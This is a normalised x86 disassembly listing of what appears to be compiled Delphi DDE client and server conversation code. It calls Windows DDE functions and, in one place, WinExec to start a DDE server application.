retn
mov edx ebp
mov eax ebx
call sub_4716f4
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_470da8
jmp r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_470da8
sub_470e68
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x4 ] eax
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_418550
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov [ esp + 0x4 ] eax
jmp r-xdata
sub_470eb0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4710f4
mov edx ebx
mov eax esi
call sub_471398
mov edx edi
mov eax esi
call sub_4713ac
mov eax esi
call sub_470f00
mov ebx eax
test bl bl
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
xor edx edx
mov eax esi
call sub_471398
xor edx edx
mov eax esi
call sub_4713ac
sub_470f00
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x108 ] edx
mov edi eax
xor eax eax
push ebp
push j_sub_4039ec#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x38 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4710dd
lea eax [ ebp - 0x108 ]
call sub_403fe8
retn
mov eax [ edi + 0x30 ]
call sub_4042a8
test eax eax
jne r-xdata
cmp [ edi + 0xa0 ] 0x0
jne r-xdata
mov eax [ edi + 0x34 ]
call sub_4042a8
test eax eax
jne r-xdata
cmp [ edi + 0xa4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x30 ]
call sub_408778
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa0 ] eax
mov eax edi
call sub_471174
jmp r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_4711b4
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x34 ]
call sub_408778
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa4 ] eax
test bl bl
jne r-xdata
mov eax [ edi + 0x30 ]
call sub_4042a8
test eax eax
jne r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
call sub_471174
jmp r-xdata
mov eax [ edi + 0xc0 ]
call sub_4042a8
test eax eax
je r-xdata
mov eax [ edi + 0xc0 ]
call sub_4042a8
test eax eax
je r-xdata
mov [ edi + 0xa8 ] 0x1
mov [ edi + 0xa8 ] eax
jmp r-xdata
push [ edi + 0x30 ]
push r-xdata
push [ edi + 0x34 ]
lea eax [ ebp - 0x108 ]
mov edx 0x3
call sub_404368
mov edx [ ebp - 0x108 ]
lea eax [ ebp - 0x101 ]
call sub_408778
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0xc0 ]
call sub_408778
jmp r-xdata
mov eax edi
mov si 0xffee
call sub_40346c
xor ecx ecx
xor edx edx
mov eax edi
call sub_4712d8
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_47122c
test al al
je r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_4711b4
mov ebx eax
push 0x7
lea eax [ ebp - 0x101 ]
push eax
call WinExec
cmp eax 0x20
jb r-xdata
sub_4710f4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
mov esi eax
mov eax ebx
call sub_471294
xor eax eax
mov [ ebx + 0x38 ] eax
push 0x0
push 0xffffffff
push esi
call DdeSetUserHandle
push esi
call DdeDisconnect
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa0 ] eax
xor edx edx
mov eax ebx
call sub_471398
xor edx edx
mov eax ebx
call sub_4713ac
pop esi
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa4 ] eax
sub_471174
push ebx
push esi
mov esi eax
mov eax [ esi + 0x9c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov bx [ eax + 0x8 ]
dec ebx
test bx bx
jb r-xdata
inc ebx
mov eax [ esi + 0x9c ]
xor edx edx
call sub_418550
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
call sub_471570
dec bx
jne r-xdata
sub_4711b4
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp ecx
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402c84
mov [ esp ] 0x24
mov [ esp + 0xc ] 0x3ec
push esp
push ebp
push edi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeConnect
mov ebx eax
mov [ esi + 0x38 ] ebx
test ebx ebx
setne al
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x3c ] 0x60
lea eax [ esi + 0x3c ]
push eax
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeQueryConvInfo
push esi
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeSetUserHandle
sub_47122c
push ebx
push esi
push edi
push ebp
mov esi eax
xor eax eax
cmp [ esi + 0x38 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_418550
mov edi eax
mov eax edi
call sub_4718f4
test al al
jne r-xdata
mov al 0x1
inc ebx
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ edi + 0x10 ]
call sub_471570
jmp r-xdata
movzx eax bx
mov edx [ esi + 0x9c ]
cmp eax [ edx + 0x8 ]
jge r-xdata
sub_471294
push ebx
push esi
push edi
push ebp
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x38 ] eax
xor ebx ebx
jmp r-xdata
mov eax edi
mov si 0xffef
call sub_40346c
movzx ebp bx
mov esi [ edi + 0x9c ]
cmp ebp [ esi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax esi
call sub_418550
call sub_4719ec
inc ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4712d8
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov [ esp ] edx
mov esi eax
xor ebx ebx
jmp r-xdata
movzx eax bx
mov ebp [ esi + 0x9c ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx edx bx
mov eax ebp
call sub_418550
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
call sub_4717a0
cmp edi [ eax + 0x8 ]
jne r-xdata
inc ebx
sub_471318
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc5 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov [ esi + 0xc5 ] bl
mov eax [ esi + 0x30 ]
call sub_4042a8
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
call sub_4042a8
test eax eax
je r-xdata
mov eax esi
call sub_470f00
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
sub_471400
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov ebx eax
mov cl [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_420b88
cmp [ esp + 0x4 ] 0x1
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x9c ] 0x0
je r-xdata
xor esi esi
jmp r-xdata
movzx edi si
mov ebp [ ebx + 0x9c ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebp
call sub_418550
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ ebx + 0x9c ]
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax edx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_471570
inc esi
sub_471474
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42086c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4714b8
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4208b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4714e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039ec#8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x34 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47156a
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x38 ]
call sub_404080
lea eax [ ebx + 0x38 ]
call sub_403fe8
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x34 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_470da8
mov edx ebx
call sub_42093c
mov eax [ ebp - 0x4 ]
call sub_4042a8
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_471570
sub_471570
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_40403c
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x34 ]
call sub_470de0
test al al
jne r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_40403c
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
call sub_403fe8
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
cmp [ eax + 0xc5 ] 0x1
je r-xdata
sub_4715cc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420b88
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
mov edx edi
mov eax [ edi + 0x34 ]
call sub_470da8
xor eax eax
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x38 ]
call sub_403fe8
sub_471608
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_403484
test al al
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_471650
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_403fe8
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_471684
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
xor eax eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4716c8
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_4719ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b20
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4716f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push j_sub_4039ec#7
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404080
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea eax [ esi + 0x4 ]
mov edx edi
call sub_40403c
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x4 ]
call sub_4042a8
test eax eax
je r-xdata
mov eax esi
call sub_4719ac
mov eax esi
call sub_47187c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471798
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax [ esi + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ eax + 0xc5 ] 0x1
jne r-xdata
mov eax esi
call sub_4718f4
mov ebx eax
test bl bl
jne r-xdata
mov bl 0x1
lea eax [ esi + 0x4 ]
call sub_403fe8
jmp r-xdata
sub_4717a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039ec#6
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4718e4
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_4041e0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_47187c
jmp r-xdata
mov eax ebx
call sub_471a0c
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax ebx
call sub_4718ec
mov eax [ ebx + 0xc ]
cmp [ eax + 0xc7 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471874
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov eax [ ebp - 0x8 ]
call sub_4042a8
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov esi 0x1
inc esi
dec edi
jne r-xdata
cmp al 0x20
jae r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + esi - 0x1 ]
test al al
jbe r-xdata
lea eax [ ebp - 0x8 ]
call j_sub_4044b4
mov [ eax + esi - 0x1 ] 0x20
sub_47187c
push ebx
push esi
push edi
push ecx
mov edi eax
xor ebx ebx
mov eax [ edi + 0xc ]
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
mov eax edi
call sub_471a0c
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0xc6 ] 0x1
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x3e8
push 0x20b0
mov eax [ eax + 0xa8 ]
push eax
mov eax [ edi + 0x8 ]
push eax
push edx
push 0xffffffff
push 0x0
call DdeClientTransaction
mov esi eax
test esi esi
je r-xdata
mov edx esi
mov eax edi
call sub_4717a0
push esi
call DdeFreeDataHandle
mov bl 0x1
jmp r-xdata
sub_4718f4
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] 0x0
mov eax [ ebx + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_4042a8
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push 0x3e8
push 0x1034
mov eax [ ebx + 0xc ]
mov edx [ eax + 0xa8 ]
push edx
mov edx [ ebx + 0x8 ]
push edx
mov eax [ eax + 0x38 ]
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
test eax eax
jne r-xdata
push 0x3ec
mov eax [ ebx + 0x4 ]
call sub_4044a8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x8 ] eax
mov [ esp ] 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_4719ac
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax ebx
call sub_4719ec
mov al 0x1
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
test edx edx
je r-xdata
push esp
push 0x3e8
push 0x8040
mov ecx [ esi + 0xa8 ]
push ecx
push edx
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
sub_4719ec
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
sub_471a18
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42086c
mov [ esi + 0x48 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_471a64
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4208b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_471aa4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_403fe8
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_471ad0
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x48 ] 0x1
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_471b80
pop esi
pop ebx
retn
sub_471afc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471b70
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
pop edx
call sub_407f04
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471b77
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
mov [ ebx + 0x48 ] 0x1
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_471b80
sub_471b80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_471c07
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3a ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_4709e4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471c0e
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_446764
mov edx [ ebp - 0x4 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_4709e4
sub_471c14
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039ec#5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
call DdeAccessData
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471c9e
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
lea eax [ ebp - 0xc ]
mov edx esi
call sub_4041e0
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
call DdeUnaccessData
mov eax ebx
call sub_471b80
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x8000
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_471cbc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420b88
cmp esi [ edi + 0x34 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_471ce4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42086c
mov edx esi
mov eax [ rw-data ]
call sub_470a48
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_471d28
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_470a5c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4208b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_471d5c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push j_sub_4039ec#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push edx
call DdeAccessData
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471dee
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
cmp [ esi + 0x42 ] 0x0
je r-xdata
mov edi 0x8000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4041e0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_471e20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42086c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_471e64
push ebx
push esi
push edi
push ebp
call sub_403624
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x34 ]
test eax eax
je r-xdata
push eax
call DdeDisconnect
mov eax [ ebp + 0x44 ]
call sub_403270
xor eax eax
mov [ ebp + 0x44 ] eax
inc esi
xor edi edi
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4208b8
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebp + 0x34 ] eax
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_418550
call sub_403270
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40360c
sub_471ee8
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x1008 ] ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039ec#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47200f
lea eax [ ebp - 0x100c ]
mov edx 0x2
call sub_40400c
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1001 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1008 ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404258
mov eax [ ebp - 0x1008 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_472234
mov edi eax
test edi edi
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4723ac
mov esi eax
mov [ esi + 0x3c ] edi
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404258
mov edx [ ebp - 0x100c ]
mov eax esi
call sub_472508
mov edx esi
mov eax [ ebx + 0x44 ]
call sub_4183f4
mov edx ebx
mov eax esi
call sub_42093c
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4044a8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x34 ] eax
sub_47201c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_472358
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x44 ]
call sub_4186ec
mov eax ebx
call sub_403270
sub_47204c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1004 ] ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039ec#2
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4720f6
lea eax [ ebp - 0x1004 ]
call sub_403fe8
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1004 ]
lea edx [ ebp - 0x1000 ]
mov ecx 0x1000
call sub_404258
